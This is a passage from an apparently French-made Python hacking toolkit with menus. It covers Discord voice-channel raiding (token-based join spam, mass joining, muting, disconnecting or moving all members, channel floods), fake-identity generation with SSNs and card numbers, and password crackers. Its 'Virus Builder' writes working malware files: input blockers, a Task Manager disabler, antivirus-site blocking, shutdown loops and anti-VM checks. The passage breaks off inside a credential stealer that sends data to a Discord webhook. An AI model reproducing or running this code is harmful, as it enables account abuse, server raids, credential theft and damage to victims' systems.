            "d": {
                "token": token,
                "properties": {"$os": "Windows", "$browser": "Chrome", "$device": "PC"},
                "compress": False,
            }
        }))
        for _ in range(30):
            try:
                ev = json.loads(ws.recv())
                if ev.get("t") == "READY":
                    break
            except Exception:
                break
        ws.send(json.dumps({
            "op": 4,
            "d": {
                "guild_id": guild_id,
                "channel_id": channel_id,
                "self_mute": False,
                "self_deaf": False,
            }
        }))
        time.sleep(hold_seconds)
        ws.send(json.dumps({
            "op": 4,
            "d": {"guild_id": guild_id, "channel_id": None,
                  "self_mute": False, "self_deaf": False}
        }))
        time.sleep(0.5)
        stop_hb["v"] = True
        ws.close()
        return True, "ok"
    except Exception as e:
        stop_hb["v"] = True
        try: ws.close()
        except Exception: pass
        return False, str(e)


def vc_discord_menu():
    while True:
        opts = [("01", "VC Joiner"),
                ("02", "VC Spammer (join/leave loop)"),
                ("03", "VC Mass Joiner (multi-tokens)"),
                ("04", "VC Channel Lister"),
                ("05", "VC Mute/Deafen Everyone (bot)"),
                ("06", "VC Disconnect Everyone (bot)"),
                ("07", "VC Move All Users (bot)"),
                ("08", "VC Flood (creer canaux vocaux)"),
                ("09", "VC Screenshare"),
                ("00", "Retour")]
        menu_box("VC DISCORD TOOLS", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": vc_joiner()
        elif c == "02": vc_spammer_loop()
        elif c == "03": vc_mass_joiner()
        elif c == "04": vc_channel_lister()
        elif c == "05": vc_mute_everyone()
        elif c == "06": vc_disconnect_everyone()
        elif c == "07": vc_move_all()
        elif c == "08": vc_flood()
        elif c == "09": vc_screenshare()
        elif c == "00": break


def vc_joiner():
    banner_s("VC JOINER")
    token = input(f"  {W}Token: {RST}").strip()
    guild_id = input(f"  {W}Server ID: {RST}").strip()
    channel_id = input(f"  {W}Voice Channel ID: {RST}").strip()
    print(f"\n{INF} Connexion gateway...")
    ok, msg = _vc_ws_join(token, guild_id, channel_id, hold_seconds=5)
    if ok: print(f"{OK} VC join envoye.")
    else: print(f"{ERR} {msg}")
    pause()


def vc_spammer_loop():
    banner_s("VC SPAMMER")
    token = input(f"  {W}Token: {RST}").strip()
    guild_id = input(f"  {W}Server ID: {RST}").strip()
    channel_id = input(f"  {W}Voice Channel ID: {RST}").strip()
    count = int(input(f"  {W}Nombre: {RST}").strip() or "10")
    delay = float(input(f"  {W}Delay (s): {RST}").strip() or "1")
    print()
    for i in range(1, count + 1):
        ok, msg = _vc_ws_join(token, guild_id, channel_id, hold_seconds=max(0.5, delay))
        col = G if ok else R
        print(f"  {col}[{i}/{count}]{RST}  {'OK' if ok else msg[:60]} ")
        time.sleep(delay)
    print(f"\n{OK} VC spam termine. ")
    pause()


def vc_mass_joiner():
    banner_s("VC MASS JOINER")
    tokens_path = input(f"  {W}Fichier tokens .txt: {RST}").strip()
    if not os.path.isfile(tokens_path):
        print(f"{ERR} Introuvable. "); pause(); return
    with open(tokens_path, encoding="utf-8", errors="ignore") as f:
        tokens = [l.strip() for l in f if l.strip()]
    guild_id = input(f"  {W}Server ID: {RST}").strip()
    channel_id = input(f"  {W}Voice Channel ID: {RST}").strip()
    print(f"\n{INF} Jointure de {len(tokens)} tokens...\n ")
    joined = 0
    for i, token in enumerate(tokens, 1):
        h = _dh(token)
        me = requests.get("https://discord.com/api/v9/users/@me", headers=h, timeout=4)
        if me.status_code != 200:
            print(f"  {R}[DEAD]{RST}  token {i} "); continue
        uname = me.json().get("username", "?")
        ok, msg = _vc_ws_join(token, guild_id, channel_id, hold_seconds=3)
        col = G if ok else R
        print(f"  {col}[{i}/{len(tokens)}]{RST}  {W}{uname}{RST}  "
              f"{'VC joined' if ok else msg[:40]} ")
        if ok: joined += 1
        time.sleep(0.4)
    print(f"\n{OK} {G}{joined}{RST} tokens dans le VC. ")
    pause()


def vc_channel_lister():
    banner_s("VC CHANNEL LISTER")
    token = input(f"  {W}Token: {RST}").strip()
    guild_id = input(f"  {W}Server ID: {RST}").strip()
    h = _dh(token)
    channels = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels",
                            headers=h).json()
    if not isinstance(channels, list):
        print(f"{ERR} Erreur. "); pause(); return
    print(f"\n  {Y}Canaux vocaux:{RST}\n ")
    vc_channels = []
    for ch in channels:
        if ch.get("type") in [2, 13]:
            ctype = "STAGE" if ch.get("type") == 13 else "VOICE"
            print(f"  {G}[{ctype}]{RST}  {W}{ch.get('name'):<25}{RST}  "
                  f"{DIM}ID: {ch.get('id')}{RST} ")
            vc_channels.append(ch)
    print(f"\n{OK} {len(vc_channels)} canaux vocaux. ")
    save_out(f"vc_channels_{guild_id}.txt",
             "\n".join(f"{c['name']} | {c['id']}" for c in vc_channels))
    pause()


def vc_mute_everyone():
    banner_s("VC MUTE/DEAFEN EVERYONE")
    token = input(f"  {W}Bot Token: {RST}").strip()
    guild_id = input(f"  {W}Server ID: {RST}").strip()
    action = input(f"  {Y}[1]{RST} Mute  {Y}[2]{RST} Deafen  {Y}[3]{RST} Both: ").strip()
    h = {"Authorization": f"Bot {token}", "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0"}
    members = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000",
                           headers=h).json()
    if not isinstance(members, list):
        print(f"{ERR} Bot invalid. "); pause(); return
    print(f"\n{INF} {len(members)} membres...\n ")
    done = 0
    for m in members:
        uid = m.get("user", {}).get("id")
        if not uid: continue
        payload = {}
        if action in ["1", "3"]: payload["mute"] = True
        if action in ["2", "3"]: payload["deaf"] = True
        r = requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}/members/{uid}",
                           headers=h, json=payload)
        col = G if r.status_code in [200, 204] else R
        print(f"  {col}[{r.status_code}]{RST}  {W}{m.get('user',{}).get('username','?')}{RST} ")
        done += 1; time.sleep(0.2)
    print(f"\n{OK} {done} membres traites. ")
    pause()


def vc_disconnect_everyone():
    banner_s("VC DISCONNECT EVERYONE")
    token = input(f"  {W}Bot Token: {RST}").strip()
    guild_id = input(f"  {W}Server ID: {RST}").strip()
    h = {"Authorization": f"Bot {token}", "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0"}
    members = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000",
                           headers=h).json()
    if not isinstance(members, list):
        print(f"{ERR} Bot invalid. "); pause(); return
    if input(f"  {R}[!]{RST} Type {BRT}DISCONNECT{RST}:  ") != "DISCONNECT":
        pause(); return
    done = 0
    for m in members:
        uid = m.get("user", {}).get("id")
        if not uid: continue
        r = requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}/members/{uid}",
                           headers=h, json={"channel_id": None})
        if r.status_code in [200, 204]:
            print(f"  {G}[KICK VC]{RST}  {W}{m.get('user',{}).get('username','?')}{RST} ")
            done += 1
        time.sleep(0.15)
    print(f"\n{OK} {done} membres deconnectes. ")
    pause()


def vc_move_all():
    banner_s("VC MOVE ALL USERS")
    token = input(f"  {W}Bot Token: {RST}").strip()
    guild_id = input(f"  {W}Server ID: {RST}").strip()
    dest_channel = input(f"  {W}Channel ID destination: {RST}").strip()
    h = {"Authorization": f"Bot {token}", "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0"}
    members = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000",
                           headers=h).json()
    if not isinstance(members, list):
        print(f"{ERR} Bot invalid. "); pause(); return
    done = 0
    for m in members:
        uid = m.get("user", {}).get("id")
        if not uid: continue
        r = requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}/members/{uid}",
                           headers=h, json={"channel_id": dest_channel})
        col = G if r.status_code in [200, 204] else DIM
        print(f"  {col}[MOVE]{RST}  {W}{m.get('user',{}).get('username','?')}{RST} -> {r.status_code}")
        if r.status_code in [200, 204]: done += 1
        time.sleep(0.15)
    print(f"\n{OK} {done} membres deplaces. ")
    pause()


def vc_flood():
    banner_s("VC FLOOD")
    token = input(f"  {W}Token (ou bot token): {RST}").strip()
    guild_id = input(f"  {W}Server ID: {RST}").strip()
    count = int(input(f"  {W}Nombre: {RST}").strip() or "10")
    name = input(f"  {W}Nom des canaux: {RST}").strip() or "leakfr"
    is_bot = input(f"  {W}Bot token? (y/n): {RST}").strip().lower() == "y"
    h = ({"Authorization": f"Bot {token}", "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0"} if is_bot else _dh(token))
    created = 0
    for i in range(1, count + 1):
        chan = f"{name}-{i}"
        r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels",
                          headers=h, json={"name": chan, "type": 2, "bitrate": 64000})
        col = G if r.status_code == 201 else R
        print(f"  {col}[{i}/{count}]{RST}  {chan}  ({r.status_code}) ")
        if r.status_code == 201: created += 1
        time.sleep(0.3)
    print(f"\n{OK} {created} canaux vocaux crees. ")
    pause()


def vc_screenshare():
    banner_s("VC SCREENSHARE JOINER")
    token = input(f"  {W}Token: {RST}").strip()
    guild_id = input(f"  {W}Server ID: {RST}").strip()
    channel_id = input(f"  {W}Voice Channel ID: {RST}").strip()
    print(f"\n{INF} Gateway join...")
    ok, msg = _vc_ws_join(token, guild_id, channel_id, hold_seconds=5)
    if ok: print(f"{OK} Screenshare VC join envoye.")
    else: print(f"{ERR} {msg}")
    pause()


# ========================================================================
# UTILITIES
# ========================================================================
def util_menu():
    while True:
        opts = [("01", "Password Hasher"), ("02", "Password Generator"),
                ("03", "IP Generator"), ("04", "Base64 Encode/Decode"),
                ("05", "XOR Encrypt/Decrypt"), ("06", "Fake Identity Generator"),
                ("07", "Hash Cracker"), ("08", "Dark Web Links"),
                ("09", "Search In Database"), ("10", "Text Converter"),
                ("11", "JWT Decoder"), ("12", "Password Zip Crack"),
                ("13", "UUID Generator"), ("14", "Caesar Cipher"),
                ("15", "MAC Generator"), ("00", "Retour")]
        menu_box("UTILITIES", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": util_hasher()
        elif c == "02": util_passgen()
        elif c == "03": util_ipgen()
        elif c == "04": util_b64()
        elif c == "05": util_xor()
        elif c == "06": util_fake_id()
        elif c == "07": util_hash_crack()
        elif c == "08": util_darkweb()
        elif c == "09": util_db_search()
        elif c == "10": util_text_conv()
        elif c == "11": util_jwt()
        elif c == "12": util_zip_crack()
        elif c == "13": util_uuid_gen()
        elif c == "14": util_caesar()
        elif c == "15": util_mac_gen()
        elif c == "00": break


def util_hasher():
    banner_s("PASSWORD HASHER")
    text = input(f"  {W}Text: {RST} ").strip(); print()
    for a in ["md5", "sha1", "sha224", "sha256", "sha384", "sha512",
              "sha3_256", "blake2b", "blake2s"]:
        h = hashlib.new(a, text.encode()).hexdigest()
        print(f"  {Y}{a:<12}{RST}  {W}{h}{RST} ")
    pause()


def util_passgen():
    banner_s("PASSWORD GENERATOR")
    length = int(input(f"  {W}Length (16): {RST} ").strip() or "16")
    count = int(input(f"  {W}Count (10): {RST} ").strip() or "10")
    sym = input(f"  {W}Symbols? (y/n): {RST} ").strip().lower() != "n"
    pool = string.ascii_letters + string.digits
    if sym: pool += "!@#$%^&*()-_=+[]{}|;:,.<>?"
    print(); pws = []
    for _ in range(count):
        pw = "".join(random.choices(pool, k=length))
        print(f"  {G}->{RST} {W}{pw}{RST} "); pws.append(pw)
    save_out("passwords.txt", "\n".join(pws)); pause()


def util_ipgen():
    banner_s("IP GENERATOR")
    count = int(input(f"  {W}Count: {RST} ").strip() or "10"); ips = []; print()
    for _ in range(count):
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        print(f"  {G}->{RST} {W}{ip}{RST} "); ips.append(ip)
    save_out("ips.txt", "\n".join(ips)); pause()


def util_b64():
    banner_s("BASE64")
    mode = input(f"  {W}(e)ncode/(d)ecode: {RST}").strip().lower()
    text = input(f"  {W}Input: {RST}").strip()
    if mode == "e":
        out = base64.b64encode(text.encode()).decode()
        print(f"\n{OK} {G}{out}{RST}")
    else:
        try:
            out = base64.b64decode(text).decode()
            print(f"\n{OK} {G}{out}{RST}")
        except Exception as e: print(f"{ERR} {e}")
    pause()


def util_xor():
    banner_s("XOR ENCRYPT/DECRYPT")
    text = input(f"  {W}Text: {RST}").strip()
    key = input(f"  {W}Key: {RST}").strip()
    if not key:
        print(f"{ERR} Need key."); pause(); return
    out = "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
    b64 = base64.b64encode(out.encode("latin-1")).decode()
    print(f"\n{OK} Result (b64): {G}{b64}{RST}"); pause()


def util_fake_id():
    banner_s("FAKE IDENTITY GENERATOR")
    fm = ["James", "Michael", "David", "Chris", "Alex", "Ryan", "Jake", "Ethan", "Noah", "Liam"]
    ff = ["Emma", "Olivia", "Sophia", "Ava", "Isabella", "Mia", "Charlotte", "Lily", "Grace", "Zoe"]
    last = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson",
            "Moore", "Taylor"]
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "protonmail.com"]
    g = random.choice(["M", "F"])
    fn = random.choice(fm if g == "M" else ff)
    ln = random.choice(last)
    yr = random.randint(1985, 2004); mo = random.randint(1, 12); dy = random.randint(1, 28)
    email = f"{fn.lower()}.{ln.lower()}{random.randint(10, 99)}@{random.choice(domains)}"
    phone = f"+1{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
    ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
    pw = "".join(random.choices(string.ascii_letters + string.digits + "!@#$", k=12))
    ssn = f"{random.randint(100, 999)}-{random.randint(10, 99)}-{random.randint(1000, 9999)}"
    cc_n = f"4{''.join(str(random.randint(0, 9)) for _ in range(15))}"
    cc_exp = f"{random.randint(1, 12):02d}/{random.randint(25, 30)}"
    cc_cvv = str(random.randint(100, 999))
    print(f"""
{Y}Name    {RST}: {W}{fn} {ln}{RST}    {Y}Gender  {RST}: {W}{g}{RST}
{Y}DOB     {RST}: {W}{yr}-{mo:02d}-{dy:02d}{RST}    {Y}SSN     {RST}: {W}{ssn}{RST}
{Y}Email   {RST}: {W}{email}{RST}
{Y}Phone   {RST}: {W}{phone}{RST}    {Y}IP      {RST}: {W}{ip}{RST}
{Y}Password{RST}: {W}{pw}{RST}
{Y}Card    {RST}: {W}{cc_n}  {cc_exp}  CVV:{cc_cvv}{RST}
""")
    save_out(f"fake_id_{fn}_{ln}.txt",
             f"Name:{fn} {ln}\nDOB:{yr}-{mo:02d}-{dy:02d}\nEmail:{email}\n"
             f"Phone:{phone}\nIP:{ip}\nPW:{pw}\nSSN:{ssn}\nCard:{cc_n} {cc_exp} {cc_cvv}")
    pause()


def util_hash_crack():
    banner_s("HASH CRACKER")
    target = input(f"  {W}Hash: {RST} ").strip().lower()
    wlist = input(f"  {W}Wordlist (blank=built-in): {RST} ").strip()
    builtin = ["password", "123456", "admin", "qwerty", "letmein", "welcome", "monkey",
               "dragon", "master", "abc123", "pass", "test", "1234", "iloveyou",
               "sunshine", "princess", "football", "shadow", "batman", "superman",
               "111111", "000000", "azerty", "soleil", "password1", "123456789",
               "12345678", "1234567890", "0987654321"]
    words = builtin
    if wlist and os.path.isfile(wlist):
        with open(wlist, encoding="utf-8", errors="ignore") as f:
            words = [l.strip() for l in f]
    print(f"{OK} {len(words)} words loaded. ")
    print(f"\n{INF} Cracking...\n "); cracked = False
    for word in words:
        for algo in ["md5", "sha1", "sha256", "sha512"]:
            if hashlib.new(algo, word.encode()).hexdigest() == target:
                print(f"\n{OK} {G}CRACKED{RST}: {BRT}{word}{RST}  ({algo}) ")
                cracked = True; break
        if cracked: break
    if not cracked: print(f"{ERR} Not found. ")
    pause()


def util_darkweb():
    banner_s("DARK WEB LINKS")
    links = [
        ("Torch Search",     "http://torchdeedp3i2jigzjdmfpn5ttjhthh5wbmda2rr3jvqjg5p77c54dqd.onion"),
        ("Ahmia (clearnet)", "https://ahmia.fi/"),
        ("DuckDuckGo (Tor)", "https://3g2upl4pq6kufc4m.onion"),
        ("The Hidden Wiki",  "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion/wiki/"),
        ("ProPublica",       "https://www.propub3r6espa33w.onion"),
        ("SecureDrop",       "http://sdolvtfhatvsysc6l34d65ymdwxcujausv7k5jk4cy5ttzhjoi6fzvyd.onion"),
    ]
    for name, url in links:
        print(f"  {G}{name:<20}{RST}  {DIM}{url}{RST} ")
    save_out("darkweb_links.txt", "\n".join(f"{n}: {u}" for n, u in links)); pause()


def util_db_search():
    banner_s("SEARCH IN DATABASE")
    query = input(f"  {W}Email/username/phone to search: {RST} ").strip()
    print(f"\n  {Y}Database leak search links:{RST}\n ")
    sites = [("HaveIBeenPwned", f"https://haveibeenpwned.com/account/{query}"),
             ("DeHashed", f"https://dehashed.com/search?query={query}"),
             ("LeakCheck", f"https://leakcheck.io/?query={query}"),
             ("Snusbase", "https://snusbase.com/"),
             ("IntelX", f"https://intelx.io/?s={query}"),
             ("Breach Directory", f"https://breachdirectory.org/?q={query}")]
    for name, url in sites:
        print(f"  {G}[{name}]{RST}  {DIM}{url}{RST} ")
    save_out(f"db_search_{query[:20]}.txt",
             "\n".join(f"{n}: {u}" for n, u in sites)); pause()


def util_text_conv():
    banner_s("TEXT CONVERTER")
    print(f"  {Y}[1]{RST} Text->Binary  {Y}[2]{RST} Text->Hex  "
          f"{Y}[3]{RST} Binary->Text  {Y}[4]{RST} Hex->Text ")
    mode = input(f"  {W}Mode: {RST} ").strip()
    text = input(f"  {W}Input: {RST} ").strip()
    if mode == "1": out = " ".join(format(ord(c), "08b") for c in text)
    elif mode == "2": out = " ".join(format(ord(c), "02x") for c in text)
    elif mode == "3":
        try: out = "".join(chr(int(b, 2)) for b in text.split())
        except Exception: out = "Error: invalid binary "
    elif mode == "4":
        try: out = bytes.fromhex(text.replace(" ", "")).decode()
        except Exception: out = "Error: invalid hex "
    else: out = "Invalid mode "
    print(f"\n{OK} {G}{out}{RST} "); pause()


def util_jwt():
    banner_s("JWT DECODER")
    token = input(f"  {W}JWT: {RST}").strip()
    parts = token.split(".")
    if len(parts) != 3:
        print(f"{ERR} Invalid JWT. "); pause(); return
    try:
        def dp(p):
            p += ("=" * ((4 - len(p) % 4) % 4))
            return json.loads(base64.b64decode(p).decode())
        h = dp(parts[0]); pl = dp(parts[1])
        print(f"\n  {Y}HEADER:{RST} "); pkv(h, 1)
        print(f"\n  {Y}PAYLOAD:{RST} "); pkv(pl, 1)
        print(f"\n  {Y}SIG:{RST}\n  {DIM}{parts[2]}{RST} ")
    except Exception as e: print(f"{ERR} {e} ")
    pause()


def util_zip_crack():
    banner_s("PASSWORD ZIP CRACK")
    zip_path = input(f"  {W}ZIP file path: {RST} ").strip()
    wlist = input(f"  {W}Wordlist path (blank=built-in): {RST} ").strip()
    try:
        import zipfile
    except Exception:
        print(f"{ERR} zipfile not available. "); pause(); return
    if not os.path.isfile(zip_path):
        print(f"{ERR} ZIP not found. "); pause(); return
    builtin = ["password", "123456", "admin", "qwerty", "1234", "12345",
               "123456789", "letmein", "abc123", "password1", "iloveyou",
               "0000", "1111", "9999"]
    words = builtin
    if wlist and os.path.isfile(wlist):
        with open(wlist, encoding="utf-8", errors="ignore") as f:
            words = [l.strip() for l in f]
    print(f"{OK} {len(words)} words loaded. ")
    print(f"\n{INF} Cracking {zip_path}...\n ")
    try:
        zf = zipfile.ZipFile(zip_path)
        for word in words:
            try:
                zf.extractall(pwd=word.encode())
                print(f"\n{OK} {G}PASSWORD FOUND{RST}: {BRT}{word}{RST} ")
                save_out(f"zip_cracked_{os.path.basename(zip_path)}.txt",
                         f"File:{zip_path}\nPassword:{word}")
                pause(); return
            except Exception:
                pass
        print(f"{ERR} Password not found in wordlist. ")
    except Exception as e: print(f"{ERR} {e} ")
    pause()


def util_uuid_gen():
    banner_s("UUID GENERATOR")
    count = int(input(f"  {W}Count: {RST}").strip() or "10")
    import uuid; print(); uuids = []
    for i in range(count):
        u = str(uuid.uuid4())
        print(f"  {G}[{i+1}]{RST} {W}{u}{RST}"); uuids.append(u)
    save_out("uuids.txt", "\n".join(uuids))
    pause()


def util_caesar():
    banner_s("CAESAR CIPHER")
    text = input(f"  {W}Texte: {RST}").strip()
    shift = int(input(f"  {W}Decalage (1-25): {RST}").strip() or "13")
    mode = input(f"  {W}(e)ncrypt/(d)ecrypt: {RST}").strip().lower()
    if mode == "d": shift = -shift
    result = ""
    for c in text:
        if c.isalpha():
            base = ord('A') if c.isupper() else ord('a')
            result += chr((ord(c) - base + shift) % 26 + base)
        else:
            result += c
    print(f"\n{OK} {G}{result}{RST} ")
    pause()


def util_mac_gen():
    banner_s("MAC ADDRESS GENERATOR")
    count = int(input(f"  {W}Count: {RST}").strip() or "10")
    print(); macs = []
    for i in range(count):
        mac = ":".join(f"{random.randint(0, 255):02x}" for _ in range(6))
        print(f"  {G}->{RST} {W}{mac}{RST} "); macs.append(mac)
    save_out("mac_addresses.txt", "\n".join(macs))
    pause()


# ========================================================================
# VIRUS BUILDER
# ========================================================================
def builder_menu():
    while True:
        opts = [("01", "Full Stealer"), ("02", "Malware Builder"),
                ("03", "Fake Error"), ("04", "Startup Persistence"),
                ("05", "Fork Bomb"), ("06", "Reverse Shell"),
                ("07", "AV Bypass Stub"), ("08", "Ransomware Note"),
                ("09", "USB Spreader"), ("00", "Retour")]
        menu_box("VIRUS BUILDER", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": builder_stealer()
        elif c == "02": builder_malware_menu()
        elif c == "03": builder_fake_error()
        elif c == "04": builder_startup()
        elif c == "05": builder_forkbomb()
        elif c == "06": builder_revshell()
        elif c == "07": builder_av_bypass()
        elif c == "08": builder_ransom_note()
        elif c == "09": builder_usb_spreader()
        elif c == "00": break


def builder_malware_menu():
    while True:
        opts = [("01", "Block Key"), ("02", "Block Mouse"),
                ("03", "Block Task Manager"), ("04", "Block AV Websites"),
                ("05", "Shutdown"), ("06", "Spam Open Program"),
                ("07", "Spam Create File"), ("08", "Anti VM + Debug"),
                ("09", "Restart Every 5min"), ("00", "Retour")]
        menu_box("MALWARE BUILDER", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": mal_block_key()
        elif c == "02": mal_block_mouse()
        elif c == "03": builder_block_taskmgr()
        elif c == "04": mal_block_av()
        elif c == "05": mal_shutdown()
        elif c == "06": mal_spam_program()
        elif c == "07": mal_spam_file()
        elif c == "08": mal_anti_vm()
        elif c == "09": mal_restart_loop()
        elif c == "00": break


def mal_block_key():
    banner_s("BLOCK KEY")
    code = r'''import ctypes
user32 = ctypes.WinDLL('user32', use_last_error=True)
import ctypes.wintypes as wt
WH_KEYBOARD_LL = 13
def low_level_handler(nCode, wParam, lParam):
    return 1
HOOKPROC = ctypes.CFUNCTYPE(ctypes.c_long, ctypes.c_int, wt.WPARAM, wt.LPARAM)
hook_proc = HOOKPROC(low_level_handler)
hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, None, 0)
msg = wt.MSG()
while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
    user32.TranslateMessage(ctypes.byref(msg))
    user32.DispatchMessageW(ctypes.byref(msg))
'''
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/block_key.py", "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/block_key.py{RST}"); pause()


def mal_block_mouse():
    banner_s("BLOCK MOUSE")
    code = r'''import ctypes, time
user32 = ctypes.windll.user32
sw = user32.GetSystemMetrics(0); sh = user32.GetSystemMetrics(1)
cx, cy = sw//2, sh//2
print("[+] Mouse blocked.")
while True:
    user32.SetCursorPos(cx, cy); time.sleep(0.01)
'''
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/block_mouse.py", "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/block_mouse.py{RST}"); pause()


def builder_block_taskmgr():
    banner_s("BLOCK TASK MANAGER")
    code = r'''import winreg
k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(k)
print("[+] Task Manager blocked.")
'''
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/block_taskmgr.py", "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/block_taskmgr.py{RST}"); pause()


def mal_block_av():
    banner_s("BLOCK AV WEBSITES")
    code = r'''import platform
if platform.system() != "Windows":
    print("[-] Windows only."); exit()
av_sites = ["virustotal.com","malwarebytes.com","avast.com","avg.com","norton.com","kaspersky.com","bitdefender.com","mcafee.com","eset.com"]
hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
try:
    with open(hosts_path, "a") as f:
        for site in av_sites:
            f.write(f"\n127.0.0.1 {site}")
            f.write(f"\n127.0.0.1 www.{site}")
    print(f"[+] Blocked {len(av_sites)} AV sites.")
except PermissionError:
    print("[-] Need admin.")
'''
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/block_av.py", "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/block_av.py{RST}"); pause()


def mal_shutdown():
    banner_s("SHUTDOWN")
    delay = input(f"  {W}Delay (s, 0=immediate): {RST} ").strip() or "0"
    code = f'''import os, platform, time
time.sleep({delay})
if platform.system() == "Windows": os.system("shutdown /s /t 0")
else: os.system("shutdown -h now")
'''
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/shutdown.py", "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/shutdown.py{RST}"); pause()


def mal_spam_program():
    banner_s("SPAM OPEN PROGRAM")
    prog = input(f"  {W}Program path: {RST} ").strip() or "notepad.exe"
    count = input(f"  {W}How many: {RST} ").strip() or "50"
    code = f'''import subprocess, time
PROGRAM = r"{prog}"
COUNT = {count}
for i in range(COUNT):
    try: subprocess.Popen([PROGRAM])
    except Exception as e: print(f"[-] {{e}}")
    time.sleep(0.1)
print(f"[+] Opened {{COUNT}} times.")
'''
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/spam_program.py", "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/spam_program.py{RST}"); pause()


def mal_spam_file():
    banner_s("SPAM CREATE FILE")
    folder = input(f"  {W}Folder: {RST} ").strip() or "C:\\Users\\Public"
    count = input(f"  {W}File count: {RST} ").strip() or "500"
    code = f'''import os, random, string
FOLDER = r"{folder}"
COUNT = {count}
os.makedirs(FOLDER, exist_ok=True)
for i in range(COUNT):
    name = "".join(random.choices(string.ascii_lowercase, k=8)) + ".txt"
    path = os.path.join(FOLDER, name)
    with open(path, "w") as f: f.write("leak-fr " * 1000)
print(f"[+] Created {{COUNT}} files in {{FOLDER}}")
'''
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/spam_file.py", "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/spam_file.py{RST}"); pause()


def mal_anti_vm():
    banner_s("ANTI VM + DEBUG")
    code = r'''import os, platform, sys, subprocess, socket
def check_vm():
    fails = []
    if platform.processor() == "": fails.append("empty processor")
    bad_hosts = ["sandbox","virus","malware","cuckoo","vmware","vbox"]
    hn = socket.gethostname().lower()
    if any(b in hn for b in bad_hosts): fails.append(f"bad hostname: {hn}")
    if platform.system() == "Windows":
        try:
            out = subprocess.run(["tasklist"], capture_output=True, text=True).stdout.lower()
            for p in ["wireshark","procmon","processhacker","ollydbg","x64dbg","ida"]:
                if p in out: fails.append(f"bad process: {p}")
        except Exception: pass
    return fails
issues = check_vm()
if issues:
    print(f"[-] VM detected: {issues}"); sys.exit(0)
else:
    print("[+] Environment clean.")
'''
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/anti_vm.py", "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/anti_vm.py{RST}"); pause()


def mal_restart_loop():
    banner_s("RESTART EVERY 5MIN")
    code = r'''import os, platform, time
print("[+] Restart loop active.")
while True:
    time.sleep(300)
    if platform.system() == "Windows": os.system("shutdown /r /t 0")
    else: os.system("reboot")
'''
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/restart_loop.py", "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/restart_loop.py{RST}"); pause()


def builder_stealer():
    banner_s("FULL STEALER BUILDER")
    webhook = input(f"  {W}Discord Webhook URL: {RST}").strip()
    out_name = input(f"  {W}Output filename: {RST}").strip() or "stealer.py"
    print(f"\n{INF} Generation du stealer complet...")
    template = '''# -*- coding: utf-8 -*-
import os, json, sqlite3, shutil, platform, socket, subprocess, re
from datetime import datetime
WEBHOOK = "__WEBHOOK__"
def _req():
    try:
        import requests; return requests
    except Exception:
        import subprocess as sp
        sp.run(["pip", "install", "requests", "--quiet"], check=False)
        import requests; return requests
req = _req()
def send(content="", embeds=None, files=None):
    try:
        data = {"content": content}
        if embeds: data["embeds"] = embeds
        if files: req.post(WEBHOOK, data=data, files=files, timeout=10)
        else: req.post(WEBHOOK, json=data, timeout=10)
    except Exception: pass
def sysinfo():
    try: pub = req.get("https://api.ipify.org", timeout=4).text.strip()
    except Exception: pub = "?"
    try:
        h = socket.gethostname(); loc = socket.gethostbyname(h)
    except Exception: h = loc = "?"
    try: user = os.getlogin()
    except Exception: user = "?"
    return {"hostname": h, "local_ip": loc, "public_ip": pub, "user": user,
            "os": platform.platform(), "cpu": platform.processor(),
            "datetime": str(datetime.now())[:19]}
def discord_tokens():
    appdata = os.environ.get("APPDATA", ""); local = os.environ.get("LOCALAPPDATA", "")
